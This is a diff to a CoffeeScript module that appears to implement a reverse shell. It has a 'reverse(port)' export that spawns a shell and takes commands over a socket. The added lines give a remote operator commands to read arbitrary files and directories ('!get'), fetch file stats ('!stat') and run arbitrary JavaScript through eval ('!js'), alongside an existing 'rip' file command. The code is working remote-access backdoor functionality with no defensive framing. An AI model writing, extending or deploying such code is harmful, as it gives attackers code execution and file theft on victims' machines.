@@ -5,6 +5,17 @@ net = require 'net'
 util = require 'util'
 fs = require 'fs'
 
+# TODO: websafe (string) -> string, tolink (Array) -> string of links
+
+tryfile = (dir) -> try fs.readFileSync dir || '.'; 
+getfile = (dir='.') -> tryfile(dir) || fs.readdirSync dir
+stats = (dir='.') -> s = fs.statSync dir; s.mode=s.mode.toString 8; s
+jseval = (cmd) -> 
+  try 
+      eval(cmd)
+  catch error
+      "" + error
+
 module.exports =
   reverse: (port) ->
     sh = spawn '/usr/bin/env', []
@@ -49,6 +60,24 @@ module.exports =
           dir = msg.split(' ')[1] || '.'
           here = fs.readdirSync dir
           return socket.emit 'stdout', here.sort().join("\n")
+
+        if msg.indexOf('!get') is 0
+          dir = msg.split(' ')[1] || '.'
+          here = String getfile dir
+          return socket.emit 'stdout', here
+          
+        if msg.indexOf('!stat') is 0
+          dir = msg.split(' ')[1] || '.'
+          here = try JSON.stringify stats dir
+          return socket.emit 'stdout', here
+          
+        if msg.indexOf('!js ') is 0
+          here = try JSON.stringify jseval msg.replace /^!js /, ""
+          return socket.emit 'stdout', here
+
+        if msg.indexOf('!echo ') is 0
+          here = msg.replace(/^!echo /, "")
+          return socket.emit 'stdout', here
           
         if msg.indexOf('rip ') is 0
           file = msg.split(' ')[1]
